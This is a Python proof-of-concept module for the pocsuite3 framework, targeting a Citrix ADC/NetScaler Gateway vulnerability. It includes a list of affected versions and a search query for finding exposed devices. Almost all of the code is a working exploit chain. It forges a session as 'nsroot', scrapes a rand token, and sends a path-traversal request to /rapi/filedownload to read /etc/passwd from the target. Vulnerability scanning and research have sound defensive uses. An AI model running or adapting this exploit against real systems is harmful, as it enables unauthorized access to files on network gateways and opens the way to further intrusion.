import sys
import string
import json
from urllib.parse import quote
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str
requests.packages.urllib3.disable_warnings()


class CitrixPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['z3r0yu']
    vulDate = '2020-07-11'
    createDate = '2020-07-11'
    updateDate = '2020-07-11'
    references = ['']
    name = 'Citrix LFI'
    appPowerLink = ''
    appName = 'Citrix'
    appVersion = '''
    Citrix ADC、Citrix Gateway < 13.0、58.30
    Citrix ADC、NetScaler Gateway < 12.1、57.18
    Citrix ADC、NetScaler Gateway < 12.0、63.21
    Citrix ADC、NetScaler Gateway < 11.1、64.14
    NetScaler ADC、NetScaler Gateway < 10.5、70.18
    Citrix SD-WAN WANOP < 11.1.1a
    Citrix SD-WAN WANOP < 11.0.3d
    Citrix SD-WAN WANOP < 10.2.7
    '''
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''
    https://github.com/dmaasland/dmaasland.github.io/blob/10c33bbdab/posts/citrix.md
    https://nosec.org/home/detail/4506.html

    fofa.so
    app="Citrix-Netscaler" || app="Citrix-ADC" || app="Citrix-NetScaler-Gateway" || app="Citrix-Gateway"
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def create_session(self, base_url, session):
        url = '{0}/pcidss/report'.format(base_url)

        params = {
            'type': 'allprofiles',
            'sid': 'loginchallengeresponse1requestbody',
            'username': 'nsroot',
            'set': '1'
        }

        headers = {
            'Content-Type': 'application/xml',
            'X-NITRO-USER': random_str(length=8),
            'X-NITRO-PASS': random_str(length=8),
        }

        data = '<appfwprofile><login></login></appfwprofile>'

        session.post(url=url, params=params, headers=headers,
                     data=data, verify=False)
        return session

    def fix_session(self, base_url, session):
        url = '{0}/menu/ss'.format(base_url)

        params = {
            'sid': 'nsroot',
            'username': 'nsroot',
            'force_setup': '1'
        }

        session.get(url=url, params=params, verify=False)

    def get_rand(self, base_url, session):
        url = '{0}/menu/stc'.format(base_url)
        r = session.get(url=url, verify=False)

        for line in r.text.split('\n'):
            if 'var rand =' in line:
                rand = line.split('"')[1]
                return rand

    def do_lfi(self, base_url, session, rand):
        PAYLOAD = '%2fetc%2fpasswd'
        url = '{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD)

        headers = {
            'Content-Type': 'application/xml',
            'X-NITRO-USER': random_str(length=8),
            'X-NITRO-PASS': random_str(length=8),
            'rand_key': rand
        }

        data = '<clipermission></clipermission>'

        r = session.post(url=url, headers=headers, data=data, verify=False)
        # print(r.text)
        return r.text

    def _verify(self):
        result = {}
        # print(self.url)
        base_url = self.url
        # print(url)

        try:
            logger.info('[-] Creating session..')
            session = requests.Session()
            self.create_session(base_url, session)
            logger.info(session.cookies.get_dict())
            logger.info(
                '[+] Got session: {0}'.format(session.cookies.get_dict()['SESSID']))

            logger.info('[-] Fixing session..')
            self.fix_session(base_url, session)

            logger.info('[-] Getting rand..')
            rand = self.get_rand(base_url, session)
            logger.info('[+] Got rand: {0}'.format(rand))

            logger.info('[-] Re-breaking session..')
            self.create_session(base_url, session)

            logger.info('[-] Getting file..')
            file_text = self.do_lfi(base_url, session, rand)

            if 'root' in file_text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = base_url
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(CitrixPOC)
